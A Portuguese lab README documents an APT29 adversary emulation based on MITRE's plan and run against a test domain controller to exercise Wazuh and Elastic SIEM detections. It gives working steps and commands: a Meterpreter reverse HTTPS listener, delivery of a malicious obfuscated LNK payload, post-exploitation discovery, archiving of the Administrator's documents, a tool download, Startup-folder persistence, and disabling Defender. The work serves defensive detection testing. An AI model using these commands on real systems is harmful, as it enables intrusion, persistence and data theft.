# Emulação APT29 — Cozy Bear

Este directório documenta a emulação do APT29 executada neste laboratório. Os scripts de emulação são baseados no plano oficial do MITRE Center for Threat-Informed Defense e foram testados e validados no ambiente descrito neste repositório.

---

## Origem dos Scripts

Os scripts de emulação são derivados do repositório oficial do MITRE:

**APT29 Adversary Emulation Plan**
[https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)

A emulação aqui documentada usa especificamente o **Lab 4.3 — Automating TTPs** do plano MAD20, que automatiza o vector de Initial Access via ficheiro LNK malicioso entregue por spearphishing.

---

## Pré-requisitos

### Software necessário no Kali-Attack

```bash
# Metasploit
msfconsole --version

# Python3 e dependências
pip3 install pylnk3 pefile

# PyFuscation (incluído no repositório MITRE)
# evillnk (incluído no repositório MITRE)
```

### Estado do WIN-DC01

Antes de executar confirma que o WIN-DC01 tem:

- Wazuh Agent activo e a enviar logs para o SOC-Core
- Sysmon64 a correr com a config Olaf
- Windows Defender desactivado (ambiente de laboratório)
- PowerShell Script Block Logging activo
- Process Creation Auditing activo (Event 4688)

---

## Setup inicial — Clone do repositório MITRE

```bash
# No Kali, clonar o repositório oficial do MITRE
cd ~/
git clone https://github.com/center-for-threat-informed-defense/adversary_emulation_library.git

# Navegar para o Lab 4.3
cd adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/

# Verificar estrutura
ls -la
```

A estrutura do Lab 4.3 que vais usar é:

```
lab_4.3/
├── auto-lnk.sh                         ← Script principal de automação
├── resources/
│   ├── ds7002.pdf                      ← PDF dummy (isca)
│   ├── loader_template.ps1             ← Template do loader PowerShell
│   └── stage1_command_template.ps1     ← Template do stage1 PowerShell
├── scripts/
│   ├── cleanup.sh                      ← Remove artefactos anteriores
│   ├── handler.rc                      ← Config do listener Metasploit
│   ├── prep-automation.sh              ← Gera o DLL Meterpreter via msfvenom
│   ├── setup_servers.sh                ← Arranca HTTP server e listener
│   └── shutdown_servers.sh             ← Para os servidores
└── tools/
    ├── append_file_with_enc.py         ← Anexa ficheiros ao LNK
    ├── configs.py                      ← Configurações do payload
    ├── evillnk.py                      ← Gerador de ficheiros LNK
    ├── lnk_payload.py                  ← Script principal do payload
    ├── PSconfig.ini                    ← Config do PyFuscation
    └── PyFuscation.py                  ← Ofuscador de scripts PowerShell
```

---

## Execução passo a passo

### Passo 1 — Preparar o listener Metasploit

Abre um terminal no Kali e arranca o listener:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  set ExitOnSession false; \
  run -j"
```

Aguarda até ver a mensagem:
```
[*] Started HTTPS reverse handler on https://0.0.0.0:443
```

### Passo 2 — Gerar o payload LNK

Abre um segundo terminal e navega para a pasta do lab:

```bash
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
chmod +x auto-lnk.sh
./auto-lnk.sh
```

O script executa automaticamente:

1. **cleanup.sh** — remove artefactos de execuções anteriores
2. **prep-automation.sh** — detecta o IP local e gera `meterpreter.dll` via msfvenom
3. **lnk_payload.py** — cria o ficheiro LNK com payload PowerShell ofuscado e comprime em `ds7002.zip`

Output esperado:
```
[+] Cleaning up previously existing artifacts
[+] Prepping required files
[+] Using Local IP Address: 192.168.10.102
[+] Creating the malicious LNK payload
[+] Payload created!
```

### Passo 3 — Servir o payload via HTTP

```bash
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
python3 -m http.server 8080
```

Output esperado:
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

### Passo 4 — Executar o payload no WIN-DC01

No WIN-DC01 abre o Microsoft Edge e navega para:

```
http://192.168.10.102:8080/ds7002.zip
```

Descarrega o ficheiro, extrai o ZIP e executa o ficheiro `ds7002.lnk`.

A sessão Meterpreter deve abrir no Kali em segundos:
```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: LAB\Administrator
```

### Passo 5 — Executar os TTPs na sessão Meterpreter

Com a sessão activa executa os TTPs na sequência documentada na [attack timeline](../02-attack-phases/attack-timeline-pt.md):

```bash
# T1087 — Account Discovery
shell
net user /domain

# T1069 — Permission Groups Discovery
net group "Domain Admins" /domain

# T1082 — System Information Discovery
systeminfo

# T1057 — Process Discovery
tasklist

# T1012 — Registry Query
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion

# T1560 — Archive Collected Data
"C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*

# T1105 — Ingress Tool Transfer
powershell.exe
Invoke-WebRequest -Uri "http://192.168.10.102:8080/ds7002.zip" -OutFile "C:\Users\Public\tool.zip"

# T1547.009 — Startup Persistence
Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force
Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## O que acontece no SIEM

Durante a execução o Wazuh Agent no WIN-DC01 captura todos os eventos e envia para o SOC-Core. O Elastic SIEM processa os eventos e dispara os alertas das 12 regras APT29 criadas via API.

Para verificar os alertas em tempo real abre o Kibana:

```
http://192.168.10.20:5601
Security -> Alerts
```

Para fazer o deploy das regras de detecção antes de executar o ataque consulta:

```
../04-detection/README.md
```

---

## Como o payload funciona internamente

O payload LNK usa uma técnica de múltiplos estágios para evadir detecção:

**Stage 1** — O ficheiro LNK executa PowerShell com `-EncodedCommand` contendo um script Base64 ofuscado com PyFuscation. Cobre T1059.001 e T1027.

**Stage 2** — O stage1 script lê o loader script que está anexado ao próprio ficheiro LNK a partir do offset `0x5e2be`. Cobre T1027.

**Stage 3** — O loader script extrai o PDF dummy e o DLL Meterpreter que também estão anexados ao LNK nos offsets `0x3000` e `0x30000`, abre o PDF como isca e carrega o DLL via rundll32. Cobre T1218.011.

**Stage 4** — O DLL Meterpreter estabelece a ligação reversa HTTPS para o Kali na porta 443. Cobre T1071.001.

---

## TTPs cobertos

| TTP | Técnica | Fase | Severity |
|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | High |
| T1204.002 | Malicious File LNK | Initial Access | High |
| T1059.001 | PowerShell Execution | Execution | High |
| T1027 | Obfuscation | Defense Evasion | High |
| T1218.011 | Rundll32 | Defense Evasion | High |
| T1071.001 | C2 HTTPS | Command and Control | High |
| T1087 | Account Discovery | Discovery | Medium |
| T1069 | Permission Groups | Discovery | Medium |
| T1082 | System Info | Discovery | Medium |
| T1057 | Process Discovery | Discovery | Medium |
| T1012 | Registry Query | Discovery | Medium |
| T1560 | Archive Collected Data | Collection | High |
| T1105 | Ingress Tool Transfer | Command and Control | High |
| T1547.009 | Startup Persistence | Persistence | High |

---

## Resolução de problemas

**O payload fecha imediatamente no WIN-DC01**

Isto acontece quando o Windows Defender está activo. Confirma que o Defender está desactivado antes de executar.

```powershell
# No WIN-DC01
Set-MpPreference -DisableRealtimeMonitoring $true
```

**A sessão Meterpreter não abre**

Confirma que o listener está activo na porta 443 e que o WIN-DC01 consegue alcançar o Kali:

```powershell
# No WIN-DC01
Test-NetConnection -ComputerName 192.168.10.102 -Port 443
```

**O msfvenom falha ao gerar o DLL**

Confirma que o Metasploit está actualizado:

```bash
msfupdate
```

---

## Referências

- [MITRE Center for Threat-Informed Defense — APT29 Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MAD20 Lab 4.3 — Automating TTPs](https://mad20.io/)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
- [Metasploit msfvenom Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
